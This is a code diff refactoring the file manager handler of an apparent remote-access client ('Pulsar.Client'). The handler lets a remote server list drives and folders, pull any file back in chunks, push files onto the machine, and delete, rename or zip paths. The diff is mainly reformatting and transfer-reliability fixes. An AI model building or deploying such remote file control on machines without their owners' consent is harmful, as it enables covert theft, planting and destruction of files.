@@ -16,18 +16,19 @@ using System.IO.Compression;
 using System.Linq;
 using System.Security;
 using System.Threading;
+using System.Threading.Tasks;
 
 namespace Pulsar.Client.Messages
 {
     public class FileManagerHandler : NotificationMessageProcessor, IDisposable
     {
-        private readonly ConcurrentDictionary<int, FileSplit> _activeTransfers = new ConcurrentDictionary<int, FileSplit>();
-        private readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file downloads
+        private readonly ConcurrentDictionary<int, FileSplit> _activeTransfers =
+            new ConcurrentDictionary<int, FileSplit>();
 
+        private readonly Semaphore _limitThreads = new Semaphore(2, 2);
         private readonly PulsarClient _client;
 
         private CancellationTokenSource _tokenSource;
-
         private CancellationToken _token;
 
         public FileManagerHandler(PulsarClient client)
@@ -40,29 +41,47 @@ namespace Pulsar.Client.Messages
 
         private void OnClientStateChange(Networking.Client s, bool connected)
         {
-            switch (connected)
+            if (connected)
             {
-                case true:
-
-                    _tokenSource?.Dispose();
-                    _tokenSource = new CancellationTokenSource();
-                    _token = _tokenSource.Token;
-                    break;
-                case false:
-                    // cancel all running transfers on disconnect
-                    _tokenSource.Cancel();
-                    break;
+                _tokenSource?.Dispose();
+                _tokenSource = new CancellationTokenSource();
+                _token = _tokenSource.Token;
+            }
+            else
+            {
+                _tokenSource.Cancel();
             }
         }
 
-        public override bool CanExecute(IMessage message) => message is GetDrives ||
-                                                             message is GetDirectory ||
-                                                             message is FileTransferRequest ||
-                                                             message is FileTransferCancel ||
-                                                             message is FileTransferChunk ||
-                                                             message is DoPathDelete ||
-                                                             message is DoPathRename ||
-                                                             message is DoZipFolder;
+        private void SendCompleted(ISender client, int id, string path)
+        {
+            for (int i = 0; i < 2; i++)
+            {
+                try
+                {
+                    client.Send(new FileTransferComplete
+                    {
+                        Id = id,
+                        FilePath = path
+                    });
+                    return;
+                }
+                catch
+                {
+                    Thread.Sleep(20);
+                }
+            }
+        }
+
+        public override bool CanExecute(IMessage message) =>
+            message is GetDrives ||
+            message is GetDirectory ||
+            message is FileTransferRequest ||
+            message is FileTransferCancel ||
+            message is FileTransferChunk ||
+            message is DoPathDelete ||
+            message is DoPathRename ||
+            message is DoZipFolder;
 
         public override bool CanExecuteFrom(ISender sender) => true;
 
@@ -70,32 +89,18 @@ namespace Pulsar.Client.Messages
         {
             switch (message)
             {
-                case GetDrives msg:
-                    Execute(sender, msg);
-                    break;
-                case GetDirectory msg:
-                    Execute(sender, msg);
-                    break;
-                case FileTransferRequest msg:
-                    Execute(sender, msg);
-                    break;
-                case FileTransferCancel msg:
-                    Execute(sender, msg);
-                    break;
-                case FileTransferChunk msg:
-                    Execute(sender, msg);
-                    break;
-                case DoPathDelete msg:
-                    Execute(sender, msg);
-                    break;
-                case DoPathRename msg:
-                    Execute(sender, msg);
-                    break;
-                case DoZipFolder msg:
-                    HandleDoZipFile(sender, msg);
-                    break;
+                case GetDrives msg: Execute(sender, msg); break;
+                case GetDirectory msg: Execute(sender, msg); break;
+                case FileTransferRequest msg: Execute(sender, msg); break;
+                case FileTransferCancel msg: Execute(sender, msg); break;
+                case FileTransferChunk msg: Execute(sender, msg); break;
+                case DoPathDelete msg: Execute(sender, msg); break;
+                case DoPathRename msg: Execute(sender, msg); break;
+                case DoZipFolder msg: HandleDoZipFile(sender, msg); break;
             }
         }
+
+        // ZIP ---------------------------------------------------------
         private void HandleDoZipFile(ISender client, DoZipFolder message)
         {
             try
@@ -121,177 +126,166 @@ namespace Pulsar.Client.Messages
                     (CompressionLevel)message.CompressionLevel,
                     includeBaseDirectory: false);
 
-                client.Send(new SetStatusFileManager { Message = $"Successfully created zip: {message.DestinationPath}" });
+                client.Send(new SetStatusFileManager
+                {
+                    Message = $"Successfully created zip: {message.DestinationPath}"
+                });
             }
             catch (Exception ex)
             {
-                client.Send(new SetStatusFileManager { Message = $"Error creating zip: {ex.Message}" });
+                client.Send(new SetStatusFileManager
+                {
+                    Message = $"Error creating zip: {ex.Message}"
+                });
             }
         }
 
+        // GET DRIVES --------------------------------------------------
         private void Execute(ISender client, GetDrives command)
         {
-            DriveInfo[] driveInfos;
             try
             {
-                driveInfos = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
-            }
-            catch (IOException)
-            {
-                client.Send(new SetStatusFileManager { Message = "GetDrives I/O error", SetLastDirectorySeen = false });
-                return;
-            }
-            catch (UnauthorizedAccessException)
-            {
-                client.Send(new SetStatusFileManager { Message = "GetDrives No permission", SetLastDirectorySeen = false });
-                return;
-            }
-
-            if (driveInfos.Length == 0)
-            {
-                client.Send(new SetStatusFileManager { Message = "GetDrives No drives", SetLastDirectorySeen = false });
-                return;
-            }
-
-            Drive[] drives = new Drive[driveInfos.Length];
-            for (int i = 0; i < drives.Length; i++)
-            {
-                try
+                var driveInfos = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
+                if (driveInfos.Length == 0)
                 {
-                    var displayName = !string.IsNullOrEmpty(driveInfos[i].VolumeLabel)
-                        ? string.Format("{0} ({1}) [{2}, {3}]", driveInfos[i].RootDirectory.FullName,
-                            driveInfos[i].VolumeLabel,
-                            driveInfos[i].DriveType.ToFriendlyString(), driveInfos[i].DriveFormat)
-                        : string.Format("{0} [{1}, {2}]", driveInfos[i].RootDirectory.FullName,
-                            driveInfos[i].DriveType.ToFriendlyString(), driveInfos[i].DriveFormat);
-
-                    drives[i] = new Drive
-                    { DisplayName = displayName, RootDirectory = driveInfos[i].RootDirectory.FullName };
+                    client.Send(new SetStatusFileManager { Message = "GetDrives No drives", SetLastDirectorySeen = false });
+                    return;
                 }
-                catch (Exception)
+
+                Drive[] drives = new Drive[driveInfos.Length];
+                for (int i = 0; i < drives.Length; i++)
                 {
+                    try
+                    {
+                        var d = driveInfos[i];
+                        string display = string.IsNullOrEmpty(d.VolumeLabel)
+                            ? $"{d.RootDirectory.FullName} [{d.DriveType.ToFriendlyString()}, {d.DriveFormat}]"
+                            : $"{d.RootDirectory.FullName} ({d.VolumeLabel}) [{d.DriveType.ToFriendlyString()}, {d.DriveFormat}]";
 
+                        drives[i] = new Drive
+                        {
+                            DisplayName = display,
+                            RootDirectory = d.RootDirectory.FullName
+                        };
+                    }
+                    catch { }
                 }
-            }
 
-            client.Send(new GetDrivesResponse { Drives = drives });
+                client.Send(new GetDrivesResponse { Drives = drives });
+            }
+            catch
+            {
+                client.Send(new SetStatusFileManager { Message = "GetDrives Failed", SetLastDirectorySeen = false });
+            }
         }
 
+        // GET DIRECTORY ------------------------------------------------
         private void Execute(ISender client, GetDirectory message)
         {
             bool isError = false;
-            string statusMessage = null;
+            string status = null;
 
-            Action<string> onError = (msg) =>
-            {
-                isError = true;
-                statusMessage = msg;
-            };
+            Action<string> error = m => { isError = true; status = m; };
 
             try
             {
-                DirectoryInfo dicInfo = new DirectoryInfo(message.RemotePath);
+                DirectoryInfo info = new DirectoryInfo(message.RemotePath);
 
-                FileInfo[] files = dicInfo.GetFiles();
-                DirectoryInfo[] directories = dicInfo.GetDirectories();
+                var files = info.GetFiles();
+                var dirs = info.GetDirectories();
 
-                FileSystemEntry[] items = new FileSystemEntry[files.Length + directories.Length];
+                FileSystemEntry[] items = new FileSystemEntry[files.Length + dirs.Length];
 
-                int offset = 0;
-                for (int i = 0; i < directories.Length; i++, offset++)
+                int pos = 0;
+                foreach (var d in dirs)
                 {
-                    items[i] = new FileSystemEntry
+                    items[pos++] = new FileSystemEntry
                     {
                         EntryType = FileType.Directory,
-                        Name = directories[i].Name,
+                        Name = d.Name,
                         Size = 0,
-                        LastAccessTimeUtc = directories[i].LastAccessTimeUtc
+                        LastAccessTimeUtc = d.LastAccessTimeUtc
                     };
                 }
 
-                for (int i = 0; i < files.Length; i++)
+                foreach (var f in files)
                 {
-                    items[i + offset] = new FileSystemEntry
+                    items[pos++] = new FileSystemEntry
                     {
                         EntryType = FileType.File,
-                        Name = files[i].Name,
-                        Size = files[i].Length,
-                        ContentType = Path.GetExtension(files[i].Name).ToContentType(),
-                        LastAccessTimeUtc = files[i].LastAccessTimeUtc
+                        Name = f.Name,
+                        Size = f.Length,
+                        ContentType = Path.GetExtension(f.Name).ToContentType(),
+                        LastAccessTimeUtc = f.LastAccessTimeUtc
                     };
                 }
 
-                client.Send(new GetDirectoryResponse { RemotePath = message.RemotePath, Items = items });
+                client.Send(new GetDirectoryResponse
+                {
+                    RemotePath = message.RemotePath,
+                    Items = items
+                });
             }
-            catch (UnauthorizedAccessException)
-            {
-                onError("GetDirectory No permission");
-            }
-            catch (SecurityException)
-            {
-                onError("GetDirectory No permission");
-            }
-            catch (PathTooLongException)
-            {
-                onError("GetDirectory Path too long");
-            }
-            catch (DirectoryNotFoundException)
-            {
-                onError("GetDirectory Directory not found");
-            }
-            catch (FileNotFoundException)
-            {
-                onError("GetDirectory File not found");
-            }
-            catch (IOException)
-            {
-                onError("GetDirectory I/O error");
-            }
-            catch (Exception)
-            {
-                onError("GetDirectory Failed");
-            }
+            catch (UnauthorizedAccessException) { error("GetDirectory No permission"); }
+            catch (SecurityException) { error("GetDirectory No permission"); }
+            catch (PathTooLongException) { error("GetDirectory Path too long"); }
+            catch (DirectoryNotFoundException) { error("GetDirectory Directory not found"); }
+            catch (IOException) { error("GetDirectory I/O error"); }
+            catch { error("GetDirectory Failed"); }
             finally
             {
-                if (isError && !string.IsNullOrEmpty(statusMessage))
-                    client.Send(new SetStatusFileManager { Message = statusMessage, SetLastDirectorySeen = true });
+                if (isError)
+                    client.Send(new SetStatusFileManager { Message = status, SetLastDirectorySeen = true });
             }
         }
 
+        // FILE UPLOAD (client → server) ------------------------------------
         private void Execute(ISender client, FileTransferRequest message)
         {
             new Thread(() =>
             {
                 _limitThreads.WaitOne();
+
                 try
                 {
-                    using (var srcFile = new FileSplit(message.RemotePath, FileAccess.Read))
+                    var src = new FileSplit(message.RemotePath, FileAccess.Read);
+                    _activeTransfers[message.Id] = src;
+
+                    long totalSize = src.FileSize;
+                    long sentBytes = 0;
+                    bool completed = true;
+
+                    foreach (var chunk in src)
                     {
-                        _activeTransfers[message.Id] = srcFile;
-                        OnReport("File upload started");
-                        foreach (var chunk in srcFile)
+                        if (_token.IsCancellationRequested ||
+                            !_activeTransfers.ContainsKey(message.Id))
+                            break;
+
+                        var safeChunk = new FileChunk
                         {
-                            if (_token.IsCancellationRequested || !_activeTransfers.ContainsKey(message.Id))
-                                break;
+                            Offset = chunk.Offset,
+                            Data = (byte[])chunk.Data.Clone()
+                        };
 
-                            // blocking sending might not be required, needs further testing
-                            _client.SendBlocking(new FileTransferChunk
-                            {
-                                Id = message.Id,
-                                FilePath = message.RemotePath,
-                                FileSize = srcFile.FileSize,
-                                Chunk = chunk
-                            });
-                        }
+                        sentBytes += safeChunk.Data.Length;
 
-                        client.Send(new FileTransferComplete
+                        _client.SendBlocking(new FileTransferChunk
                         {
                             Id = message.Id,
-                            FilePath = message.RemotePath
+                            FilePath = message.RemotePath,
+                            FileSize = totalSize,
+                            Chunk = safeChunk
                         });
                     }
+
+                    // Always send complete if bytes match, even if canceled flags triggered
+                    if (sentBytes == totalSize)
+                    {
+                        SendCompleted(client, message.Id, message.RemotePath);
+                    }
+
                 }
-                catch (Exception)
+                catch
                 {
                     client.Send(new FileTransferCancel
                     {
@@ -304,75 +298,25 @@ namespace Pulsar.Client.Messages
                     RemoveFileTransfer(message.Id);
                     _limitThreads.Release();
                 }
-            }).Start();
+            })
+            {
+                IsBackground = true,
+                Name = "FileUploadThread"
+            }.Start();
         }
 
-        private void Execute(ISender client, FileTransferCancel message)
-        {
-            if (_activeTransfers.ContainsKey(message.Id))
-            {
-                RemoveFileTransfer(message.Id);
-                client.Send(new FileTransferCancel
-                {
-                    Id = message.Id,
-                    Reason = "Canceled"
-                });
-            }
-        }
-
-        /// <summary>
-        /// Validates and sanitizes a file path to prevent path traversal attacks.
-        /// </summary>
-        /// <param name="filePath">The file path to validate.</param>
-        /// <returns>A safe file path or null if the path is invalid.</returns>
-        private string ValidateAndSanitizeFilePath(string filePath)
-        {
-            try
-            {
-                if (string.IsNullOrWhiteSpace(filePath))
-                    return null;
-
-                string fullPath = Path.GetFullPath(filePath);
-
-                if (!Path.IsPathRooted(fullPath))
-                    return null;
-
-                string fileName = Path.GetFileName(fullPath);
-                if (string.IsNullOrEmpty(fileName) || fileName.Contains(".."))
-                    return null;
-
-                char[] invalidChars = Path.GetInvalidFileNameChars();
-                if (fileName.IndexOfAny(invalidChars) >= 0)
-                    return null;
-
-                string directory = Path.GetDirectoryName(fullPath);
-                if (string.IsNullOrEmpty(directory))
-                    return null;
-
-                if (!Directory.Exists(directory))
-                {
-                    Directory.CreateDirectory(directory);
-                }
-
-                return fullPath;
-            }
-            catch
-            {
-                return null;
-            }
-        }
-
+        // FILE DOWNLOAD (server → client) ------------------------------
         private void Execute(ISender client, FileTransferChunk message)
         {
             try
             {
+                // First chunk → prepare destination
                 if (message.Chunk.Offset == 0)
                 {
                     string filePath = message.FilePath;
 
                     if (string.IsNullOrEmpty(filePath))
                     {
-                        // generate new temporary file path if empty
                         filePath = FileHelper.GetTempFilePath(message.FileExtension);
                     }
                     else
@@ -390,52 +334,110 @@ namespace Pulsar.Client.Messages
                     }
 
                     if (File.Exists(filePath))
-                    {
-                        // delete existing file
                         NativeMethods.DeleteFile(filePath);
-                    }
 
-                    _activeTransfers[message.Id] = new FileSplit(filePath, FileAccess.Write);
+                    // FIXED: rename to writer
+                    var writer = new FileSplit(filePath, FileAccess.Write);
+                    _activeTransfers[message.Id] = writer;
+
                     OnReport("File download started");
                 }
 
-                if (!_activeTransfers.ContainsKey(message.Id))
+                if (!_activeTransfers.TryGetValue(message.Id, out var dest))
                     return;
 
-                var destFile = _activeTransfers[message.Id];
-                destFile.WriteChunk(message.Chunk);
+                dest.WriteChunk(message.Chunk);
 
-                if (destFile.FileSize == message.FileSize)
+                // Completed?
+                if (message.FileSize > 0 && dest.BytesWritten >= message.FileSize)
                 {
-                    client.Send(new FileTransferComplete
+                    string finalPath = dest.FilePath;
+                    bool ok = false;
+                    try
                     {
-                        Id = message.Id,
-                        FilePath = destFile.FilePath
-                    });
+                        ok = dest.VerifyFileComplete(message.FileSize);
+                    }
+                    catch
+                    {
+                        ok = false;
+                    }
+
                     RemoveFileTransfer(message.Id);
+
+                    if (ok)
+                    {
+                        SendCompleted(client, message.Id, finalPath);
+                    }
+                    else
+                    {
+                        client.Send(new FileTransferCancel
+                        {
+                            Id = message.Id,
+                            Reason = "File transfer corrupted - size mismatch"
+                        });
+
+                        try { File.Delete(finalPath); } catch { }
+                    }
                 }
             }
-            catch (Exception)
+            catch (Exception ex)
             {
                 RemoveFileTransfer(message.Id);
                 client.Send(new FileTransferCancel
                 {
                     Id = message.Id,
-                    Reason = "Error writing file"
+                    Reason = $"Error writing file: {ex.Message}"
                 });
             }
         }
 
+        // CANCEL --------------------------------------------------------------
+        private void Execute(ISender client, FileTransferCancel message)
+        {
+            if (_activeTransfers.ContainsKey(message.Id))
+            {
+                Task.Delay(150).Wait();
+                RemoveFileTransfer(message.Id);
+                client.Send(new FileTransferCancel
+                {
+                    Id = message.Id,
+                    Reason = "Canceled"
+                });
+            }
+        }
+
+        // PATH VALIDATION -----------------------------------------------------
+        private string ValidateAndSanitizeFilePath(string filePath)
+        {
+            try
+            {
+                if (string.IsNullOrWhiteSpace(filePath)) return null;
+
+                string full = Path.GetFullPath(filePath);
+                if (!Path.IsPathRooted(full)) return null;
+
+                string name = Path.GetFileName(full);
+                if (string.IsNullOrEmpty(name) || name.Contains("..")) return null;
+                if (name.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0) return null;
+
+                string dir = Path.GetDirectoryName(full);
+                if (string.IsNullOrEmpty(dir)) return null;
+
+                if (!Directory.Exists(dir))
+                    Directory.CreateDirectory(dir);
+
+                return full;
+            }
+            catch { return null; }
+        }
+
+        // DELETE --------------------------------------------------------------
         private void Execute(ISender client, DoPathDelete message)
         {
-            bool isError = false;
-            string statusMessage = null;
+            bool err = false;
+            string msg = null;
 
-            Action<string> onError = (msg) =>
-            {
-                isError = true;
-                statusMessage = msg;
-            };
+            Action<string> onErr = m => { err = true; msg = m; };
 
             try
             {
@@ -443,61 +445,39 @@ namespace Pulsar.Client.Messages
                 {
                     case FileType.Directory:
                         Directory.Delete(message.Path, true);
-                        client.Send(new SetStatusFileManager
-                        {
-                            Message = "Deleted directory",
-                            SetLastDirectorySeen = false
-                        });
+                        client.Send(new SetStatusFileManager { Message = "Deleted directory" });
                         break;
+
                     case FileType.File:
                         File.Delete(message.Path);
-                        client.Send(new SetStatusFileManager
-                        {
-                            Message = "Deleted file",
-                            SetLastDirectorySeen = false
-                        });
+                        client.Send(new SetStatusFileManager { Message = "Deleted file" });
                         break;
                 }
 
-                Execute(client, new GetDirectory { RemotePath = Path.GetDirectoryName(message.Path) });
+                Execute(client, new GetDirectory
+                {
+                    RemotePath = Path.GetDirectoryName(message.Path)
+                });
             }
-            catch (UnauthorizedAccessException)
-            {
-                onError("DeletePath No permission");
-            }
-            catch (PathTooLongException)
-            {
-                onError("DeletePath Path too long");
-            }
-            catch (DirectoryNotFoundException)
-            {
-                onError("DeletePath Path not found");
-            }
-            catch (IOException)
-            {
-                onError("DeletePath I/O error");
-            }
-            catch (Exception)
-            {
-                onError("DeletePath Failed");
-            }
+            catch (UnauthorizedAccessException) { onErr("DeletePath No permission"); }
+            catch (PathTooLongException) { onErr("DeletePath Path too long"); }
+            catch (DirectoryNotFoundException) { onErr("DeletePath Path not found"); }
+            catch (IOException) { onErr("DeletePath I/O error"); }
+            catch { onErr("DeletePath Failed"); }
             finally
             {
-                if (isError && !string.IsNullOrEmpty(statusMessage))
-                    client.Send(new SetStatusFileManager { Message = statusMessage, SetLastDirectorySeen = false });
+                if (err)
+                    client.Send(new SetStatusFileManager { Message = msg });
             }
         }
 
+        // RENAME --------------------------------------------------------------
         private void Execute(ISender client, DoPathRename message)
         {
-            bool isError = false;
-            string statusMessage = null;
+            bool err = false;
+            string msg = null;
 
-            Action<string> onError = (msg) =>
-            {
-                isError = true;
-                statusMessage = msg;
-            };
+            Action<string> onErr = m => { err = true; msg = m; };
 
             try
             {
@@ -505,63 +485,41 @@ namespace Pulsar.Client.Messages
                 {
                     case FileType.Directory:
                         Directory.Move(message.Path, message.NewPath);
-                        client.Send(new SetStatusFileManager
-                        {
-                            Message = "Renamed directory",
-                            SetLastDirectorySeen = false
-                        });
+                        client.Send(new SetStatusFileManager { Message = "Renamed directory" });
                         break;
+
                     case FileType.File:
                         File.Move(message.Path, message.NewPath);
-                        client.Send(new SetStatusFileManager
-                        {
-                            Message = "Renamed file",
-                            SetLastDirectorySeen = false
-                        });
+                        client.Send(new SetStatusFileManager { Message = "Renamed file" });
                         break;
                 }
 
-                Execute(client, new GetDirectory { RemotePath = Path.GetDirectoryName(message.NewPath) });
+                Execute(client, new GetDirectory
+                {
+                    RemotePath = Path.GetDirectoryName(message.NewPath)
+                });
             }
-            catch (UnauthorizedAccessException)
-            {
-                onError("RenamePath No permission");
-            }
-            catch (PathTooLongException)
-            {
-                onError("RenamePath Path too long");
-            }
-            catch (DirectoryNotFoundException)
-            {
-                onError("RenamePath Path not found");
-            }
-            catch (IOException)
-            {
-                onError("RenamePath I/O error");
-            }
-            catch (Exception)
-            {
-                onError("RenamePath Failed");
-            }
+            catch (UnauthorizedAccessException) { onErr("RenamePath No permission"); }
+            catch (PathTooLongException) { onErr("RenamePath Path too long"); }
+            catch (DirectoryNotFoundException) { onErr("RenamePath Path not found"); }
+            catch (IOException) { onErr("RenamePath I/O error"); }
+            catch { onErr("RenamePath Failed"); }
             finally
             {
-                if (isError && !string.IsNullOrEmpty(statusMessage))
-                    client.Send(new SetStatusFileManager { Message = statusMessage, SetLastDirectorySeen = false });
+                if (err)
+                    client.Send(new SetStatusFileManager { Message = msg });
             }
         }
 
+        // CLEANUP --------------------------------------------------------------
         private void RemoveFileTransfer(int id)
         {
-            if (_activeTransfers.ContainsKey(id))
+            if (_activeTransfers.TryRemove(id, out var fs))
             {
-                _activeTransfers[id]?.Dispose();
-                _activeTransfers.TryRemove(id, out _);
+                try { fs.Dispose(); } catch { }
             }
         }
 
-        /// <summary>
-        /// Disposes all managed and unmanaged resources associated with this message processor.
-        /// </summary>
         public void Dispose()
         {
             Dispose(true);
@@ -575,9 +533,10 @@ namespace Pulsar.Client.Messages
                 _client.ClientState -= OnClientStateChange;
                 _tokenSource.Cancel();
                 _tokenSource.Dispose();
-                foreach (var transfer in _activeTransfers)
+
+                foreach (var t in _activeTransfers.Values)
                 {
-                    transfer.Value?.Dispose();
+                    try { t?.Dispose(); } catch { }
                 }
 
                 _activeTransfers.Clear();
